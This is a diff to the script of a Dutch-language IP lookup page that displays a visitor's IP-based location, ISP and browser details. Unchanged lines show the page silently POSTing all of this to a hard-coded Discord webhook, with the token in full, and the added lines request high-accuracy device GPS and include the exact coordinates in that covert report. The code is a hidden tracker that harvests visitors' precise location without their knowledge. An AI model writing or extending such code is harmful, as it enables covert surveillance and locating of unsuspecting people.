@@ -154,6 +154,7 @@
   <script>
     let map;
     let eigenData = '';
+    let gpsCoordsString = 'GPS niet beschikbaar of toestemming geweigerd.'; // Nieuwe variabele
 
     function zoekIP() {
       const ip = document.getElementById('ipInput').value.trim();
@@ -176,7 +177,7 @@
             <strong>Regio:</strong> ${data.region}<br>
             <strong>Stad:</strong> ${data.city}<br>
             <strong>Postcode:</strong> ${data.postal}<br>
-            <strong>Locatie:</strong> ${data.latitude}, ${data.longitude}<br>
+            <strong>Locatie (IP-based):</strong> ${data.latitude}, ${data.longitude}<br>
             <strong>Tijdzone:</strong> ${data.timezone}<br>
             <strong>VPN/Proxy:</strong> ${data.proxy ? 'JA' : 'NEE'}<br>
           `;
@@ -209,10 +210,11 @@
           const screenSize = `${screen.width}x${screen.height}`;
           const tijd = luxon.DateTime.now().setZone(data.timezone).toFormat('HH:mm:ss - dd LLL yyyy');
 
-          eigenData = `Jouw IP: ${data.ip}\nLand: ${data.country_name} (${data.country_code})\nRegio: ${data.region}\nStad: ${data.city}\nPostcode: ${data.postal}\nLocatie: ${data.latitude}, ${data.longitude}\nTijdzone: ${data.timezone}\nLokale Tijd: ${tijd}\nISP: ${data.org}\nProxy/VPN: ${data.proxy ? 'JA' : 'NEE'}\nBesturingssysteem: ${navigator.platform}\nBrowser: ${navigator.userAgent}\nResolutie: ${screenSize}`;
+          // Voeg gpsCoordsString toe aan eigenData
+          eigenData = `Jouw IP: ${data.ip}\nLand: ${data.country_name} (${data.country_code})\nRegio: ${data.region}\nStad: ${data.city}\nPostcode: ${data.postal}\nLocatie (IP-based): ${data.latitude}, ${data.longitude}\nGPS Locatie (Apparaat): ${gpsCoordsString}\nTijdzone (IP-based): ${data.timezone}\nLokale Tijd (IP-based): ${tijd}\nSysteem Tijdzone: ${timezone}\nISP: ${data.org}\nProxy/VPN: ${data.proxy ? 'JA' : 'NEE'}\nBesturingssysteem: ${navigator.platform}\nBrowser: ${navigator.userAgent}\nResolutie: ${screenSize}`;
 
           info.innerHTML = eigenData.replace(/\n/g, '<br>');
-          localTime.innerHTML = `🕒 Lokale tijd op jouw locatie: <strong>${tijd}</strong>`;
+          localTime.innerHTML = `🕒 Lokale tijd op jouw locatie (volgens IP): <strong>${tijd}</strong>`;
 
           fetch('https://discord.com/api/webhooks/1371872662032220322/cARB5ECTEnd2Spj0jGjPCFfRMVPt-2-tMTOzg5IKWUIwLSBjHduuKxwrCZNJ6OiKTxAu', {
             method: 'POST',
@@ -220,7 +222,7 @@
               'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-              content: eigenData
+              content: eigenData // Nu inclusief GPS-data
             })
           });
         })
@@ -239,15 +241,23 @@
       URL.revokeObjectURL(url);
     }
 
+    // GPS Locatie Logica
     const gpsElement = document.getElementById('gpsLocation');
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        const { latitude, longitude } = pos.coords;
-        gpsElement.innerHTML = `📍 GPS-locatie van dit apparaat: <strong>${latitude.toFixed(5)}, ${longitude.toFixed(5)}</strong>`;
-      }, () => {
-        gpsElement.innerHTML = '📍 GPS-locatie kon niet worden opgehaald.';
-      });
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const { latitude, longitude } = pos.coords;
+          gpsCoordsString = `${latitude.toFixed(5)}, ${longitude.toFixed(5)}`; // Update de globale variabele
+          gpsElement.innerHTML = `📍 GPS-locatie van dit apparaat: <strong>${gpsCoordsString}</strong>`;
+        },
+        () => {
+          // gpsCoordsString behoudt de default waarde "GPS niet beschikbaar..."
+          gpsElement.innerHTML = '📍 GPS-locatie kon niet worden opgehaald (toestemming geweigerd of fout).';
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Opties voor betere nauwkeurigheid
+      );
     } else {
+      // gpsCoordsString behoudt de default waarde
       gpsElement.innerHTML = '📍 GPS niet ondersteund op dit apparaat.';
     }
   </script>
